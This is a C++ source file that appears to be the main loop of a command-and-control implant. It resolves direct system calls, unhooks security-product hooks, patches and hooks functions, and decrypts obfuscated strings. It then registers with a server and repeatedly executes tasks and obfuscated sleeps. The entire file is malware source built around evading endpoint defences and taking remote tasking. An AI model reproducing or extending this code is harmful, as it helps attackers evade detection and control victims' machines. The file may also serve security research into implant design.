#include "Main.hpp"
#include "PatcherAndHooker.hpp"
#include "Instance.hpp"
#include "Unhooker.hpp"
#include "Crypt.hpp"
#include "Win32.hpp"
#include "Http.hpp"
#include "SleepObfuscation.hpp"
#include "StackHeapCrypt.hpp"
#include "StringCrypt.hpp"
#include "SecureString.hpp"
#include "SecureException.hpp"
#include <stdexcept>
#include <iostream>

void InitiateClasses() {
    StringCrypt& stringCrypt = StringCrypt::Get();
    SystemCalls& syscalls = SystemCalls::Get();
    Instance& instance = Instance::Get();    
    Win32& win32 = Win32::Get();
    Unhooker& unhooker = Unhooker::Get();
    PatcherAndHooker& patcherAndHooker = PatcherAndHooker::Get();
    Crypt& crypt = Crypt::Get();
    Http& http = Http::Get();

    if (!syscalls.SysTable.isResolved) {
        throw SecureException(StringCrypt::DecryptString(StringCrypt::FAILEDTORESOLVEVXTABLE_CRYPT));
    }

    unhooker.DoUnhook();
    patcherAndHooker.DoPatches(false);
    if (Instance::HeapEncrypt) {
        patcherAndHooker.HookHeapFunctions(false);
    }
}

LONG CALLBACK GlobalVectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    printf("Global handler: Exception caught. Code: 0x%x\n", pExceptionInfo->ExceptionRecord->ExceptionCode);

    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // Handle the exception or log more details
        return EXCEPTION_CONTINUE_EXECUTION;  // or EXCEPTION_CONTINUE_SEARCH;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main(int argc, char** argv) {
    // Uncomment this line to enable global exception handling
    //PVOID handle = AddVectoredExceptionHandler(1, GlobalVectoredExceptionHandler);

    try {
        InitiateClasses();
        Instance::Register();                
    }
    catch (const SecureException& e) {
        std::cerr << StringCrypt::DecryptString(StringCrypt::SECUREEXCEPTION_CRYPT).c_str() << e.what() << std::endl;
        return 1;
    }
    catch (...) {
        // This will catch any other exceptions that are not derived from SecureException
        std::cerr << StringCrypt::DecryptString(StringCrypt::UNKNOWNEXCEPTIONOCCURRED_CRYPT).c_str() << std::endl;
        return 1;
    }

    while (true) {
        try {
            if (Instance::ErrorCount > Instance::MaxRetries) {
                Instance::LogError(StringCrypt::DecryptString(StringCrypt::MAXRETRIESREACHED_CRYPT));
                return 1;
			}
            Instance::ExecuteTasks();
            Instance::StartSleep();
            Instance::ErrorCount = 0;
        }
        catch (const SecureException& e) {
            SecureString error = StringCrypt::DecryptString(StringCrypt::SECUREEXCEPTION_CRYPT);
            error.append(e.what());
            Instance::LogError(error);
            Instance::ErrorCount++;
		}
        catch (...) {
            SecureString error = StringCrypt::DecryptString(StringCrypt::UNKNOWNEXCEPTIONOCCURRED_CRYPT);
            Instance::LogError(error);
            Instance::ErrorCount++;
		}
    }
}